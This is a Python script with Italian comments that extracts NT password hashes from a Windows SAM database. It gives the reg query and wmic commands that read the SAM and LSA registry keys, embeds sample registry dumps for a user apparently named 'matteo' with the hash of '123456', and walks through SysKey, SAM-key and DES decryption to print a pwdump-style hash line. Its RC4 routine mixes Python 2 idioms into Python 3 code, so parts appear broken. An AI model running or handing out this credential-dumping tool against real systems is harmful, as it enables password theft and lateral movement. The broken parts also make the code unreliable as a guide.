# Cosa serve per far funzionare questo script?
# 1) RID dell'utente
# 2) Il valore esadecimale del registro "hklm\sam\sam\domains\account\users\{RID}"
# 3) Il valore esadecimale del registro "hklm\SAM\SAM\Domains\Account\F"
# 4) I valori per costruire SysKey cioè "HKLM\System\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}"

#1) Per estrarre il RID utente usiamo: il comando:
#   wmic useraccount where name='Administrator' get sid
#   dove al posto che Administrator inseriamo il nome dell'account di cui necessitiamo trovare il RID
#   Per l'account Administrator il RID è 500 o in esadecimale 0x1F4
#   copiamo qui sotto il valore esadecimale
RID = 1001

#2) Per estrarre il valore esadecimale del registro "hklm\sam\sam\domains\account\users\000001F4"
#   usiamo questo comando, dove al posto che 000001F4 ci sarà il RID del nostro utente in valore esadecimale
#   reg query "hklm\sam\sam\domains\account\users\000001F4" | find "V"
#   copiamo ed incolliamo qui sotto il valore esadecimale
HexRegHash = '00000000F400000003000100F40000000C0000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000000000000000000000010000080000000100000008010000180000000000000020010000380000000000000058010000180000000000000070010000180000000000000001001480D4000000E40000001400000044000000020030000200000002C014004400050101010000000000010000000002C01400FF070F0001010000000000050700000002009000040000000000240044000200010500000000000515000000D4653FBF3A68FDC51CEE586EE9030000000038001B030200010A00000000000F0300000000040000DEA22867213ED2AF19AD5D79B0C107292756FC20D8AD66F610F268FADF2AF80F00001800FF070F0001020000000000052000000020020000000014005B03020001010000000000010000000001020000000000052000000020020000010200000000000520000000200200006D0061007400740065006F00010200000700000002000200000000008DF6EFA636BC6949C62D83B5F93C4CBE0200020010000000270E5D7E2B251E0903D456E85F3B773E7CEA03811A68FEFC0EB7A9D6A5BDB9E3116099F16CA2C88E460AB393FF92C9AC020002000000000000F7B77463F64B12EB2CE933412FD0CA02000200000000003FB3C146C551DF8D2ECC460BC49A7BD5'

#3) Per estrarre il valore esadecimale del registro "hklm\SAM\SAM\Domains\Account\F"
#   usiamo questo comando:
#   reg query "hklm\SAM\SAM\Domains\Account" /v F | find "BINARY"
#   copiamo ed incolliamo qui sotto il valore esadecimale
HexRegSysk = '0300010000000000FED4E24AE147D50101000000000000000080A60AFFDEFFFF0000000000000000000000000000008000CC1DCFFBFFFFFF00CC1DCFFBFFFFFF0000000000000000EB030000000000000000000000000000010000000300000001000000000001000200000070000000300000002000000036DEF779E00E3E2D7FD44B053BED4D610ED8A73B1E58190879E2DD7B8FB2CFAE5E4DA32E079729072FC204A848720D51130DE0009D8A1DEE8B2BB146B2A39DB49F7D60875E754212E8C38920C1B566DFB28A43BA521DE033116CB22B221A14F60000000000000000000000000000000002000000700000003000000020000000C25878514E7326C9E30FCD38369EBB98EEB27CBEE6198103A87E1EE9E71E8883952873D15D95A93DC460246F8810A3C6658B631E055BFD4FA6A2886A1F7C2C6AD218243D3722E20E746964A04491F2708F0E901C28592444616DE60E2284682D000000000000000000000000000000000200000000000000'

#4) Per estrarre i valori per costruire SysKey cioè "HKLM\System\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}"
#   dobbiamo estrarre come file .txt le classi da Lsa e poi prendere i corrispettivi valori dell'attributo "Class Name"
jd = 'fd8d8e29'
skew1 = '476fe408'
gbg = 'd60f7d95'
data = 'b8bb62ca'

import hashlib, os, binascii
os.system('cls' if os.name == 'nt' else 'clear')

## Dati e key sono stringhe esadecimali  ('ABCDEFGH')
def decryptRC4(data, key):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    S = range(256)
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i] , S[j] = S[j] , S[i]
    i = 0
    j = 0
    risultato=''
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        risultato += chr(ord(char) ^ S[(S[i] + S[j]) % 256])
    return binascii.hexlify(risultato)

## Dati e key sono stringhe esadecimali ('ABCDEFGH')
def decryptAES(data, key, salt):
    try: from Crypto.Cipher import AES
    except:
        print('Error: Crypto non trovato, perfavore esegui "pip install pycryptodome" come amministratore')
        input('Premi Invio per uscire')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    salt = binascii.unhexlify(salt)
    cipher = AES.new(key, AES.MODE_CBC, salt)
    return binascii.hexlify(cipher.decrypt(data))

## Dati e key sono stringhe esadecimali ('ABCDEFGH')
def decryptDES(data, key):
    try: from Crypto.Cipher import DES
    except:
        print('Error: Crypto non trovato, perfavore esegui "pip install pycryptodome" come amministratore')
        input('Premi Invio per uscire')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    cipher = DES.new(key, DES.MODE_ECB)
    return binascii.hexlify(cipher.decrypt(data))

## Calcolo bit di parita'
def str_to_key(dessrc):
    bkey = binascii.unhexlify(dessrc)
    keyarr = []
    for i in range(0,len(bkey)): keyarr.append(int(hex(bkey[i]),16))
    bytearr = []
    bytearr.append(keyarr[0]>>1)
    bytearr.append(((keyarr[0] & 0x01) << 6) | keyarr[1] >> 2)
    bytearr.append(((keyarr[1] & 0x03) << 5) | keyarr[2] >> 3)
    bytearr.append(((keyarr[2] & 0x07) << 4) | keyarr[3] >> 4)
    bytearr.append(((keyarr[3] & 0x0F) << 3) | keyarr[4] >> 5)
    bytearr.append(((keyarr[4] & 0x1F) << 2) | keyarr[5] >> 6)
    bytearr.append(((keyarr[5] & 0x3F) << 1) | keyarr[6] >> 7)
    bytearr.append(keyarr[6]&0x7F)
    result = ''
    for b in bytearr:
        bit = bin(b*2)[2:].zfill(8)
        if bit.count('1')% 2  == 0: ## Stessa parità quindi è necessario l'RMB bitflip 
            result += hex((b * 2) ^ 1)[2:].zfill(2)
        else:
            result += hex(b * 2)[2:].zfill(2)
    return result

##############################################################################################################
##############################################################################################################

##qua si estrae il nome utente
RegHash = binascii.unhexlify(HexRegHash)
UsernameOffset = int(binascii.hexlify(bytes([RegHash[0xc]])), 16) + 0xcc
UsernameLength = int(binascii.hexlify(bytes([RegHash[0xc+4]])),16)
Username = RegHash[UsernameOffset:UsernameOffset+UsernameLength].decode('utf-8').replace('\x00','')
print('Username (offset 0xc): ' + Username + "\n")

print('########~~~~~~ STEP1, estrazione del double encrypted NTLM Hash ~~~~~~########')
Offset = HexRegHash[0xA8*2:(0xA8+4)*2] ## l'offset è tipo 'a0010000'
HexOffset = "0x"+"".join(map(str.__add__, Offset[-2::-2], Offset[-1::-2])) ## l'offset è tipo '0x1a0'
NTOffset = int(HexOffset,16)+int("0xcc",16) ## l'offset è tipo 0x1a0+0xcc=0x26c
Length = HexRegHash[0xAC*2:(0xAC+4)*2] ## la lunghezza è tipo '14000000'
HexLength = "0x"+"".join(map(str.__add__, Length[-2::-2], Length[-1::-2])) ## la lunghezza è tipo '0x14'
Length=int(HexLength,16) ## lunghezza tipo 0x14 (versione prima 1607) o 0x38 (dalla versione 1607)
print('L\'Offset è '+hex(NTOffset)+' ed è lungo '+hex(Length))
##QUESTO PASSAGGIO SUCCESSIVO VIENE MANTENUTO SOLO SE SI USA RC4, MENTRE DENTRO ALL'IF CI SONO LE CONDIZIONI PER AES oppure se non si usa la password o un altro metodo di crittografia.
Hash = HexRegHash[(NTOffset+4)*2: (NTOffset+4+Length)*2][:32] ## Necessari solo di 16 bytes
if hex(Length)=='0x38':
    print('Trovato Nuovo stile di Hash (AES), è necessario IV')
    Hash = HexRegHash[(NTOffset + 24) * 2: (NTOffset + 24 + Length) * 2][:32] ## Necessari solo di 16 bytes
    IV = HexRegHash[(NTOffset + 8) *2:(NTOffset + 24) * 2] ## IV necessario per decrittografia con AES
    print('NT IV: ' + IV)
elif not hex(Length)=='0x14':
    print('Errore: La lunghezza non è 0x14, l\'utente probabilmente non ha la password?')
    input('Premi Invio per uscire')
    exit()
print('Il double encrypted Hash dovrebbe essere: ' + Hash + "\n") ## D4442D6644EDAE736D4F3DFB8FF04F0F


print('########~~~~~~ STEP2, Combinazione della SysKey ~~~~~~########')
Scrambled = jd + skew1 + gbg + data
Syskey = Scrambled[8*2:8*2+2]+Scrambled[5*2:5*2+2]+Scrambled[4*2:4*2+2]+Scrambled[2*2:2*2+2]
Syskey += Scrambled[11*2:11*2+2]+Scrambled[9*2:9*2+2]+Scrambled[13*2:13*2+2]+Scrambled[3*2:3*2+2]
Syskey += Scrambled[0*2:0*2+2]+Scrambled[6*2:6*2+2]+Scrambled[1*2:1*2+2]+Scrambled[12*2:12*2+2]
Syskey += Scrambled[14*2:14*2+2]+Scrambled[10*2:10*2+2]+Scrambled[15*2:15*2+2]+Scrambled[7*2:7*2+2]
print("La tua Syskey dovrebbe essere: " + Syskey + "\n") ## 5a6c489141f82ca35d05593fce33b996

print('########~~~~~~ STEP3, Uso della Syskey con RC4/AES per decifrare la SAMkey ~~~~~~########')
hBootVersion = int(HexRegSysk[0x00:(0x00+1)*2], 16) ##  Il primo byte contiene al verisone
if hBootVersion==3: ## cifrato con AES!
    print('Trovato Nuovo stile di Hash (AES), è necessario IV')
    hBootIV = HexRegSysk[0x78*2:(0x78+16)*2] ## 16 Bytes dell'IV
    encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32] ## Necessari solo di 16 bytes
    SAMkey = decryptAES(encSysk, Syskey, hBootIV)
else:
    Part = binascii.unhexlify(HexRegSysk[0x70*2:(0x70+16)*2])
    Qwerty = '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'+"\x00"
    Syskey = binascii.unhexlify(Syskey)
    Digits = '0123456789012345678901234567890123456789'+"\x00"
    RC4Key = binascii.hexlify(hashlib.md5(Part + Qwerty + Syskey + Digits).digest())
    encSysk = HexRegSysk[0x80*2:(0x80+32)*2][:32]  ## Necessari solo di 16 bytes
    SAMkey = decryptRC4(encSysk, RC4Key)
print('La tua  SAMKey dovrebbe essere: ' + SAMkey.decode('utf-8') + "\n")

print('########~~~~~~ STEP4, Uso di SAMkey con RC4/AES per decriptare l\'Hash ~~~~~~########')
HexRID = hex(RID)[2:].zfill(8) ## 500 diventa '000001f4'
HexRID = binascii.unhexlify("".join(map(str.__add__, HexRID[-2::-2], HexRID[-1::-2]))) ## '000001f4' diventa 'f4010000'
if hex(Length)=='0x14': ## Hash Criptato con RC4
    NTPASSWORD = 'NTPASSWORD'+"\x00"
    SAMKEY = binascii.unhexlify(SAMkey)
    HashRC4Key = binascii.hexlify(hashlib.md5(SAMKEY+HexRID+NTPASSWORD).digest())
    EncryptedHash = decryptRC4(Hash, HashRC4Key) ## Hash dallo step 1, RC4Key dallo step 3 (76f1327b198c0731ae2611dab42716ea)
if hex(Length)=='0x38': ## Hash criptato con AES
    EncryptedHash = decryptAES(Hash, SAMkey, IV) #494e7ccb2dad245ec2094db427a37ebf6731aed779271e6923cb91a7f6560b0d
print('Il tuo Hash criptato (Risultato di DES) dovrebbe essere: ' + EncryptedHash.decode('utf-8') + "\n") ## a291d14b768a6ac455a0ab9d376d8551

print('########~~~~~~ STEP5, Uso di DES derivato dal RID per decriptare totalmente l\'Hash ~~~~~~########')
DES_SOURCE1 = str(hex(HexRID[0])).replace('0x','').zfill(2) + str(hex(HexRID[1])).replace('0x','').zfill(2) + str(hex(HexRID[2])).replace('0x','').zfill(2) + str(hex(HexRID[3])).replace('0x','').zfill(2) + str(hex(HexRID[0])).replace('0x','').zfill(2) + str(hex(HexRID[1])).replace('0x','').zfill(2) + str(hex(HexRID[2])).replace('0x','').zfill(2) ##f4010000 becomes f4010000f40100
DES_SOURCE2 = str(hex(HexRID[3])).replace('0x','').zfill(2) + str(hex(HexRID[0])).replace('0x','').zfill(2) + str(hex(HexRID[1])).replace('0x','').zfill(2) + str(hex(HexRID[2])).replace('0x','').zfill(2) + str(hex(HexRID[3])).replace('0x','').zfill(2) + str(hex(HexRID[0])).replace('0x','').zfill(2) + str(hex(HexRID[1])).replace('0x','').zfill(2)
#  Ora i DESSOURCE1 e 2 qui sopra, sono convertiti da 7 byte a 8 byte (usando i bit di parità dispari):
DES_KEY1 = str_to_key(DES_SOURCE1)
DES_KEY2 = str_to_key(DES_SOURCE2)
print('K1',DES_KEY1)
print('K2',DES_KEY2)
DecryptedHash = decryptDES(EncryptedHash[:16], DES_KEY1) + decryptDES(EncryptedHash[16:], DES_KEY2)
print('\n########~~~~~~FINALE~~~~~~########')
print('Il tuo NT-Hash dovrebbe essere: ' + DecryptedHash.decode('utf-8')) ## 32ed87bdb5fdc5e9cba88547376818d4 che è '123456'
print(str(RID)+':aad3b435b51404eeaad3b435b51404ee:'+DecryptedHash.decode('utf-8') + "\n")
input('E\' stato fatto tutto. Premi invio per chiudere il tool')